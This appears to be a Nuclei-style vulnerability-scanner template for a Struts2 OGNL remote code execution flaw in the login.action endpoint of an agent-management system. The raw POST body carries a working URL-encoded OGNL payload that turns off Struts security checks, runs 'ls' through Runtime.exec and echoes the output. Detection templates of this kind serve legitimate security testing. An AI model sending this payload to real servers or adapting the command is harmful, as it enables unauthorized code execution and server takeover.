id: struts2-rce-login-action

info:
  name: Struts2 Remote Code Execution (AgentSyste代理商管理系统 login.action)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for a remote code execution vulnerability in Struts2 within the AgentSyste代理商管理系统 login.action endpoint.
    The vulnerability exploits unsafe OGNL expressions allowing attackers to execute arbitrary commands on the server.
  tags: rce,struts2,critical

http:
  - raw:
      - |
        POST /login.action HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
        Content-Type: application/x-www-form-urlencoded

        debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22ls%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "bin"
          - "etc"

      - type: word
        part: header
        words:
          - "Content-Type: text/plain"

    stop-at-first-match: true
